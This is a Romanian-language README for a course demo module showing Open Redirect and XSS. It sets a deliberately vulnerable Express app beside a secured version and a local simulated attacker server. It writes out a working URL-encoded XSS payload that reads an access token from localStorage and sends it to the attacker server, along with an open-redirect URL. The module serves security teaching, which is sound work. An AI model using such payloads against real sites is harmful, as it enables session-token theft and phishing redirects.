# Modul demo:Open Redirect si XSS

Acest modul face parte din proiectul realizat in echipa pentru disciplina de securitate. Scopul lui este de a demonstra doua vulnerabilitati frecvente in aplicatiile web: **Open Redirect** (redirectionare deschisa, utilizata in atacuri de tip phishing) si **XSS** (Cross-Site Scripting), in scenariul furtului de token din LocalStorage.

Implementarea utilizeaza Node.js, Express si HTML/JS fara framework-uri front-end, pentru claritate si pentru a permite urmarirea directa a codului sursa.

---

## Structura proiectului

- **vulnerable-app** (port 3000) – Aplicatie demonstrativa cu vulnerabilitati intentionate: accepta orice URL la parametrul de redirect dupa autentificare si afiseaza parametrul de cautare cu `innerHTML`, ceea ce permite executia de scripturi injectate.
- **secure-app** (port 3001) – Varianta securizata: validare a parametrului de redirect conform unui white list (stil OAuth 2.1) si afisare a parametrului de cautare cu `textContent`, eliminand riscul de XSS.
- **attacker-server** (port 4000) – Server auxiliar care simuleaza atacatorul: primeste redirectionarile si tokenurile exfiltrate; este folosit exclusiv pentru demonstrarea atacurilor in mediu local.

---

## Pornirea aplicatiilor

Din radacina directorului proiectului se ruleaza:

```bash
npm install
cd vulnerable-app && npm install && cd ..
cd attacker-server && npm install && cd ..
cd secure-app && npm install && cd ..
npm start
```

## Reproducerea vulnerabilitatilor (aplicatia vulnerabila)

1. **Initializare sesiune (login demonstrativ)**  
   Se goleste storage-ul pentru localhost:3000 (F12 → Application → Clear storage), apoi se deschide in browser:  
   `http://localhost:3000/dashboard.html?login=true`  
   Rezultat asteptat: mesaj „Welcome, CEO Victim” in bara de navigare.

2. **Open Redirect**  
   Se deschide URL-ul:  
   `http://localhost:3000/login?next=http://localhost:4000/capture`  
   Se apasa butonul **SSO Login**. Browserul este redirectionat catre serverul atacator; se afiseaza o pagina de tip „Session Expired”. In terminal apare logul **OPEN REDIRECT CAPTURE**, confirmand succesul redirectionarii catre domeniul atacatorului.

3. **XSS – furt de token**  
   Se revine pe dashboard: `http://localhost:3000/dashboard.html?login=true`, apoi se introduce in bara de adrese URL-ul codat:  
   `http://localhost:3000/dashboard.html?q=%3Cimg%20src%3Dx%20onerror%3D%22fetch(%27http%3A%2F%2Flocalhost%3A4000%2Fsteal%3Ftoken%3D%27.concat(localStorage.getItem(%27access_token%27)))%22%3E`  
   Rezultat asteptat: in terminal apare **STOLEN JWT** si payload-ul decodat (nume, rol), dovedind exfiltrarea tokenului.

**Observatie:** Utilizarea URL-ului necodat conduce la truncarea parametrului `q` din cauza caracterului `&`, astfel ca scriptul injectat nu se executa; de aceea este necesar URL-ul codat de mai sus.

---

## Verificarea variantei securizate

Se opresc serverele (Ctrl+C), apoi se ruleaza:

```bash
npm run start:secure
```

Aplicatia securizata ruleaza pe port 3001 (interfata cu tema verde si badge OAuth 2.1).

- **Open Redirect:** La accesarea `http://localhost:3001/login?next=http://localhost:4000/capture` si apasarea **SSO Login**, utilizatorul ramane pe domeniul aplicatiei (localhost:3001); redirectionarea catre serverul atacator este respinsa.
- **XSS:** Acelasi URL cu parametrul `q` malitios pe portul 3001 afiseaza payload-ul ca text, fara executie de script; serverul atacator nu primeste niciun token.

---

## Remedieri implementate (rezumat)

- **Open Redirect:** In `vulnerable-app/server.js` parametrul `next` nu este validat; in `secure-app/server.js` se valideaza impotriva unui white list de URL-uri (same-origin, path-uri permise), conform recomandarilor OAuth 2.1.
- **XSS:** In aplicatia vulnerabila parametrul de cautare este afisat cu `innerHTML`; in `secure-app/public/dashboard.html` se foloseste exclusiv `textContent`, eliminand executia de cod injectat.

---

## Referinta URL-uri pentru teste

**Aplicatie vulnerabila (port 3000):**  
- Login: `http://localhost:3000/dashboard.html?login=true`  
- Open redirect: `http://localhost:3000/login?next=http://localhost:4000/capture` (apoi SSO Login)  
- XSS (URL codat): `http://localhost:3000/dashboard.html?q=%3Cimg%20src%3Dx%20onerror%3D%22fetch(%27http%3A%2F%2Flocalhost%3A4000%2Fsteal%3Ftoken%3D%27.concat(localStorage.getItem(%27access_token%27)))%22%3E`

**Aplicatie securizata (port 3001):**  
- Login: `http://localhost:3001/dashboard.html?login=true`  
- Redirect respins: `http://localhost:3001/login?next=http://localhost:4000/capture` (apoi SSO Login; utilizatorul ramane pe 3001)
- XSS (URL codat): `http://localhost:3001/dashboard.html?q=%3Cimg%20src%3Dx%20onerror%3D%22fetch(%27http%3A%2F%2Flocalhost%3A4000%2Fsteal%3Ftoken%3D%27.concat(localStorage.getItem(%27access_token%27)))%22%3E`

---

